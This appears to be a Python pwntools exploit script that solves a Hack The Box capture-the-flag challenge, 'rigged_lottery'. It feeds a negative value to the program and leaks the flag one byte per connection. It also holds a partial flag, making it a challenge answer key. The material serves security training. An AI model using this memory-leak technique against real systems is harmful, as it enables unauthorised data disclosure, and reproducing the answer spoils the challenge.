#!/usr/bin/env python3

from pwn import *

exe = ELF("rigged_lottery")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("docker.hackthebox.eu", 30269)


def main():

    buf = "HTB{strcpy_0nly_c4us3s_tr0ub"
    for i in range(len(buf),32):
        r = conn()
        r.recvuntil("4. Exit.\n")
        r.sendline("2")
        r.sendline("-300")
        r.recvuntil("4. Exit.\n")
        r.sendline("1")
        r.sendline(str(i))
        r.recvuntil("4. Exit.\n")
        r.sendline("3")
        r.recvuntil("prize!!\n\n")
        res = r.recvall()
        buf += chr(res[i])
        # print(buf)
    print(buf)

if __name__ == "__main__":
    main()
